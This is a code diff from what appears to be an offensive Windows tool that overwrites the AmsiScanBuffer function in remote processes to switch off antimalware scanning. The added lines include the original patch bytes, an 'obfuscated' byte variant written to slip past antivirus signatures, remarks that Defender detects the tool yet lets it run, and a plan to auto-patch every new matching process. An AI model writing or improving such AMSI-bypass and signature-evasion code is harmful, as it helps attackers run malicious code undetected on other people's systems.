@@ -18,6 +18,8 @@ AV Stuff:
 Defender flags on this in the current state: 
     >> Behavior:Win32/Gracing.IQ - which ChatGPT tells me is a Behavior based detection. Fun.
 
+
+HOWEVER, it still lets it run which is hilarious. The patch works, despite the detection.
 */
 
 #include <windows.h>
@@ -38,13 +40,11 @@ public:
     HANDLE remoteProcessHandle;
     HMODULE remoteAmsiLibraryAddress;
     uintptr_t remoteAmsiScanBufferFunctionAddress;
+
     //OG patch
     //unsigned char patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //this is prolly signatured
-
     //(badly) obsf patch
     unsigned char patch[6] = { 0xB9, 0x58, 0x01, 0x08, 0x81, 0xC4 };
-
-
 
     RemoteAmsiPatch(DWORD pid) {
         this->remoteProcessPID = pid;
@@ -316,4 +316,14 @@ int main() {
 
     return 0;
 }
+
+/*
+watchdog idea:
+
+ arg: --autopatch
+
+Monitor new processes (easiset way would be polling via createsnapshot), find new processes that fit the mold, if
+they are not in a list that exists, go ahead and run the patch on them.
+
+*/
 
